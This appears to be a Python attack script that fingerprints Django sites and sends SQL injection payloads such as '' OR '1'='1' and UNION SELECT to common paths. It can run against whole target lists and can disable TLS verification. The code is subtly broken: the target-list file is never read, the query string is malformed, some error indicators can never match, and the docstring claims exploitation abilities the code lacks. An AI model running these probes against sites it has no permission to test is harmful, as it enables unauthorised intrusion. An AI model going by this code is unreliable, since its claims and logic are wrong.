#!/usr/bin/env python3
"""
Django SQL Injection Vulnerability Scanner
==========================================
Scans Django-based web applications for SQL injection vulnerabilities by analyzing query behaviors and actively probing 
potential injection points. This tool can be used for detection and exploitation tests, especially useful in bug bounty 
assessments and red team activities.

Vulnerability Details:
  - Targeting Django applications with improper query sanitization
  - Focuses on user-provided inputs in URLs, forms, and headers that map directly to database queries
  - Detects common symptoms like database-related error responses and unexpected query results
  - Exploitable vulnerabilities can lead to unauthorized data access and remote code execution

Usage:
  # Scan a single target
  python django_sql_injection_scanner.py --target https://example-django-app.com

  # Scan a list of targets
  python django_sql_injection_scanner.py --list targets.txt --output findings.json

  # Safe mode — detection only, no exploitation attempts
  python django_sql_injection_scanner.py --list targets.txt --safe

References:
  - https://docs.djangoproject.com/en/stable/releases/security/
  - https://owasp.org/www-community/attacks/SQL_Injection
  - https://cwe.mitre.org/data/definitions/89.html
"""

import asyncio
import argparse
import json
import re
from urllib.parse import urlparse, urlencode

import httpx

# ── Constants ────────────────────────────────────────────────────────────────

VULNERABILITY_INDICATORS = [
    "sqlite3.OperationalError",
    "django.db.utils.ProgrammingError",
    "django.db.utils.DatabaseError",
    "relation does not exist",
    "syntax error at or near",
    "unclosed quotation",
    "column does not exist",
]

FINGERPRINT_PATTERNS = [
    r'<meta name="description" content="Powered by Django">',
    r"Django version \d+\.\d+",
]

DETECTION_PATHS = [
    "/",
    "/login/",
    "/admin/",
    "/search/",
]

DEFAULT_PROBES = [
    "' OR '1'='1",
    "' UNION SELECT null--",
    "' AND 1=2--",
]

SEMAPHORE_LIMIT = 20
REQUEST_TIMEOUT = 10
DEFAULT_CONCURRENCY = 5

# ── Helpers ──────────────────────────────────────────────────────────────────

def normalize_url(url: str) -> str:
    """Ensure URL starts with an appropriate scheme and does not end with a trailing slash."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


def color_text(text: str, color_code: str) -> str:
    """Wrap text with ANSI color escape codes."""
    return f"{color_code}{text}\033[0m"


def parse_version(text: str):
    """Extract and parse the first Django version found in text."""
    for pattern in FINGERPRINT_PATTERNS:
        match = re.search(pattern, text)
        if match:
            return match.group()
    return None

# ── Scanner Logic ────────────────────────────────────────────────────────────

async def detect_django(client: httpx.AsyncClient, base_url: str, semaphore):
    """Detect Django by scanning the base URL."""
    async with semaphore:
        detected = False
        version = None

        for path in DETECTION_PATHS:
            url = f"{base_url}{path}"
            try:
                response = await client.get(url, timeout=REQUEST_TIMEOUT)
                if any(indicator in response.text for indicator in FINGERPRINT_PATTERNS):
                    detected = True
                    for pattern in FINGERPRINT_PATTERNS:
                        match = re.search(pattern, response.text)
                        if match:
                            version = match.group()
                            break
            except (httpx.RequestError, Exception):
                pass

        return {
            "url": base_url,
            "detected": detected,
            "version": version,
        }


async def probe_sql_injection(client: httpx.AsyncClient, base_url: str, probe_path: str, semaphore, safe_mode=False):
    """Probe for SQL injection vulnerabilities with user-supplied payloads."""
    async with semaphore:
        vulnerabilities = []
        url = f"{base_url}{probe_path}?search="

        for payload in (DEFAULT_PROBES if not safe_mode else [""]):
            full_url = f"{url}{urlencode({'q': payload})}"
            try:
                response = await client.get(full_url, timeout=REQUEST_TIMEOUT)
                if any(indicator in response.text.lower() for indicator in VULNERABILITY_INDICATORS):
                    vulnerabilities.append({
                        "payload": payload,
                        "raw_response": response.text[:200],
                    })
                    if not safe_mode:
                        break
            except (httpx.RequestError, Exception):
                pass

        return vulnerabilities


async def scan_target(client: httpx.AsyncClient, target: str, semaphore, safe_mode=False):
    """Scan a target for Django presence and SQL injection vulnerabilities."""
    target_info = await detect_django(client, target, semaphore)

    if not target_info["detected"]:
        return {**target_info, "vulnerabilities": []}

    vulnerabilities = []
    for path in DETECTION_PATHS:
        probes = await probe_sql_injection(client, target, path, semaphore, safe_mode)
        if probes:
            vulnerabilities.extend(probes)

    return {**target_info, "vulnerabilities": vulnerabilities}


async def main(args):
    semaphore = asyncio.Semaphore(args.concurrency)
    connector = httpx.AsyncClient(verify=not args.no_verify)
    tasks = []

    targets = [normalize_url(url.strip()) for url in args.list] if args.list else [normalize_url(args.target)]
    for target in targets:
        tasks.append(scan_target(connector, target, semaphore, args.safe))

    results = await asyncio.gather(*tasks)
    connector.aclose()

    # Print results to console
    for result in results:
        status_color = {
            None: "\033[33m",  # INFO (yellow)
            False: "\033[32m", # SAFE (green)
            True: "\033[31m",  # CRITICAL (red)
        }[bool(result["vulnerabilities"])]
        
        print(color_text(f"[+] {result['url']} • Detected: {result['detected']} • Django {result['version']} • Vulnerable: {'CRITICAL' if result['vulnerabilities'] else 'SAFE'}", status_color))

    # Write results to JSON output
    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=4)


# ── Entry Point ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Django SQL Injection Vulnerability Scanner")
    parser.add_argument("--target", help="Target base URL to scan")
    parser.add_argument("--list", help="Path to file containing list of URLs to scan")
    parser.add_argument("--output", help="File to store JSON results")
    parser.add_argument("--safe", action="store_true", help="Safe mode - detection only, no exploitation attempts")
    parser.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY, help="Concurrent scan limit (default: 5)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification")

    args = parser.parse_args()
    asyncio.run(main(args))
